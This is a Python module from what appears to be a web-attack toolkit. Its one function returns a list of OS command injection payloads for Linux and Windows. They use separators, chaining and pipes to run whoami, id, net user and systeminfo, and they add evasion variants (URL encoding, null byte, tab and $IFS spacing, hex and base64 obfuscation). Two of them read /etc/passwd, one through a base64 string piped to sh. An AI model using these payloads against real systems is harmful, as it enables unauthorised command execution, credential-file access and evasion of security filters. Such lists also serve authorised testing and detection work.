# modules/cmdinj.py

def get_cmd_payloads():
    print("[DEBUG] Inside get_cmd_payloads()")

    payloads = [
        {
            "type": "Linux - Basic",
            "payload": "; ls",
            "bypass": "Simple command separator"
        },
        {
            "type": "Linux - Chain",
            "payload": "&& whoami",
            "bypass": "Chained command using &&"
        },
        {
            "type": "Linux - Pipe",
            "payload": "| id",
            "bypass": "Command pipe execution"
        },
        {
            "type": "Windows - Net User",
            "payload": "| net user",
            "bypass": "Windows user enumeration"
        },
        {
            "type": "Windows - System Info",
            "payload": "& systeminfo",
            "bypass": "Command chaining"
        },
        {
            "type": "WAF Bypass - URL Encoded",
            "payload": "%26%26 whoami",
            "bypass": "URL-encoded &&"
        },
        {
            "type": "Null Byte Injection",
            "payload": ";whoami%00",
            "bypass": "Null byte injection"
        },
        {
            "type": "Obfuscated - Tab Spacing",
            "payload": "&&\twhoami",
            "bypass": "Using tab to bypass space filters"
        },
        {
            "type": "Obfuscated - $IFS",
            "payload": "cat$IFS/etc/passwd",
            "bypass": "Using IFS to avoid space detection"
        },
        {
            "type": "Obfuscated - ${IFS}",
            "payload": "ping${IFS}-c${IFS}3${IFS}127.0.0.1",
            "bypass": "Using shell variable IFS"
        },
        {
            "type": "Hex Obfuscation (echo)",
            "payload": "$(echo -e '\\x6c\\x73')",
            "bypass": "Hex-encoded command (e.g., 'ls')"
        },
        {
            "type": "Base64 Decode Execution",
            "payload": "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh)",
            "bypass": "Base64 encoded payload decoded and executed"
        }
    ]

    return payloads
